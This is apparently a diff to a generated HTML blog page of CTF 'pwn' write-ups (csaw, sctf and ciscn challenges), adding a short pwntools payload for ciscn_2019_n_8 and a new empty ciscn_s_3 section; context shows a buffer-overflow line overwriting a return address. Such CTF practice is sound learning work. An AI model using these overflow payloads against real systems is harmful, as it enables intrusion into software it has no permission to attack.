@@ -26,7 +26,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ciscn-s-3"><span class="toc-text">0x08:ciscn_s_3</span></a></li></ol></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -323,7 +323,10 @@ ret = <span class="hljs-number">0x0000000000400501</span>
 p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x38</span>+p64(sys))</code></pre>
 
 <h2 id="0x06-ciscn-2019-en-2">0x06:ciscn_2019_en_2<a class="post-anchor" href="#0x06-ciscn-2019-en-2"></a></h2><p>同 ciscn_2019_c_1</p>
-<h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2>
+<h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2><pre><code class="hljs python">payload = <span class="hljs-string">"\x11"</span> * <span class="hljs-number">0x35</span>
+p.sendline(payload)</code></pre>
+
+<h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2>
 
   
     <div class="post-reward">
